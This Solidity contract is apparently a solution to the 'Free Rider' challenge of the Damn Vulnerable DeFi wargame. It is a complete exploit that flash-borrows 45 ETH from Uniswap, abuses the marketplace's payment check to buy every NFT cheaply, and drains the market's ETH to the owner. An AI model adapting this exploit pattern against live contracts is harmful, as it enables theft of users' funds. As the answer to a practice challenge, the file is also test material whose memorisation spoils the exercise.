pragma solidity ^0.8.0;

import "./FreeRiderBuyer.sol";
import "./FreeRiderNFTMarketplace.sol";
import "@uniswap/v2-periphery/contracts/interfaces/IUniswapV2Router02.sol";
import "@uniswap/v2-core/contracts/interfaces/IUniswapV2Factory.sol";
import "@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol";
import "@uniswap/v2-core/contracts/interfaces/IUniswapV2Callee.sol";
import "../WETH9.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";

contract FreeRiderAttacker is IUniswapV2Callee, IERC721Receiver{

    // 1. flash loan 45 eth from uniswap
    // 2. buy all NFTs with 15 eth, 30e left in attacker, 15e left in market.
    // 3. offer 2 NFTs with  15 eth.
    // 4. buy 2 NFTs with 15 eth, no eth left in market, 45e left in attacker.
    // 5. transfer all NFTs to buyer and get the sward, pay back the loan
    address public owner;
    FreeRiderNFTMarketplace public market;
    FreeRiderBuyer public buyer;
    DamnValuableNFT public nft;
    IUniswapV2Pair public pair;
    WETH9 public weth;
    


    constructor (address marketAddr, address buyerAddr, address nftAddr, address pairAddr, address payable wethAddr) {
        owner = msg.sender;
        market = FreeRiderNFTMarketplace(payable(marketAddr));
        buyer = FreeRiderBuyer(buyerAddr);
        nft = DamnValuableNFT(nftAddr);
        pair = IUniswapV2Pair(pairAddr);
        weth = WETH9(wethAddr);
    }

    function attack() public {
        nft.setApprovalForAll(address(market), true);
        pair.swap(45 ether, 0, address(this), bytes("aa"));
        payable(owner).transfer(address(this).balance);
    }   

    function uniswapV2Call(address sender, uint amount0, uint amount1, bytes calldata data) override external{
        weth.withdraw(45 ether);
        uint256[] memory tokenIds1 = new uint256[](6);
        for (uint i=0;i<6;i++)
            tokenIds1[i]=i;
        uint256[] memory tokenIds2 = new uint256[](2);
        tokenIds2[0]=0;tokenIds2[1]=1;
        uint256[] memory moneys = new uint256[](2);
        moneys[0]=15 ether;moneys[1]=15 ether;
        market.buyMany{value:15 ether}(tokenIds1);
        market.offerMany(tokenIds2, moneys);
        market.buyMany{value:15 ether}(tokenIds2);
        for (uint i=0;i<6;i++)
            nft.safeTransferFrom(address(this), address(buyer), i);
        weth.deposit{value:46 ether}();
        weth.transfer(msg.sender, 46 ether);
    }

    function onERC721Received(
        address,
        address,
        uint256 _tokenId,
        bytes memory
    ) 
        external
        override
        returns (bytes4) {
            return IERC721Receiver.onERC721Received.selector;
        }

    receive() external payable{}
}